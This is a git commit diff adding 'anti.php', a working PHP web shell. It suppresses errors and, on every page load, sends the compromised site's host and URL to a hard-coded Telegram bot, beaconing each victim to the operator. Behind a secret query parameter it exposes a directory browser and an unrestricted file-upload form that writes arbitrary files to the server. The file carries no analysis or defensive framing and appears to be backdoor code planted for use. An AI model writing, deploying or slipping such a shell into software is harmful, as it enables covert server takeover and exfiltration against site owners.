b81894e21adacfced184e06b4c5012d9d1a27b8e
PhenaxGod <76651777+PhenaxGod@users.noreply.github.com>
2021-05-20 05:38:30 +0000

    Create anti.php

--- anti.php
+++ anti.php
@@ -1,9 +1,10 @@
+
 error_reporting(0);
 error_log(0);
 
 file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001198429476&text=Old: " . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
 
-if (!empty($_GET['action']) && $_GET['action'] == "start") {
+if (!empty($_GET['fucked']) && $_GET['fucked'] == "up") {
    error_reporting(0);
 
 
@@ -21,11 +22,11 @@ if (!empty($_GET['action']) && $_GET['action'] == "start") {
    foreach($paths as $id=>$pat){
       if($pat == '' && $id == 0){
          $a = true;
-         echo '<a href="?action=start&&path=/">/</a>';
+         echo '<a href="?fucked=up&&path=/">/</a>';
          continue;
       }
       if($pat == '') continue;
-      echo '<a href="?action=start&&path=';
+      echo '<a href="?fucked=up&&path=';
       for($i=0;$i<=$id;$i++){
          echo "$paths[$i]";
          if($i != $id) echo "/";
@@ -33,7 +34,7 @@ if (!empty($_GET['action']) && $_GET['action'] == "start") {
       echo '">'.$pat.'</a>/';
    }
 
-   echo '<br><b>Upload File:</b><form method=POST enctype="multipart/form-data" action=""><input type=hidden name=path><input type="file" name="file"><input type=submit value="Upload"></form>';
+   echo '<br><b>Upload File:</b><form method=POST enctype="multipart/form-data" fucked=""><input type=hidden name=path><input type="file" name="file"><input type=submit value="Upload"></form>';
    if (!empty($_FILES['file']['name'])) {
       $fullpath = $_REQUEST['path'] . $_FILES['file']['name'];
       if (@copy($_FILES['file']['tmp_name'], $fullpath)) {
@@ -45,7 +46,7 @@ if (!empty($_GET['action']) && $_GET['action'] == "start") {
    if (is_dir($path)){
       if ($dh = opendir($path)){
          while (($file = readdir($dh)) !== false){
-            echo '<a href="?action=start&&path='.$path.'/'.$file.'">'.$file.'</a>' . '<br>';
+            echo '<a href="?fucked=up&&path='.$path.'/'.$file.'">'.$file.'</a>' . '<br>';
          }
          closedir($dh);
       }
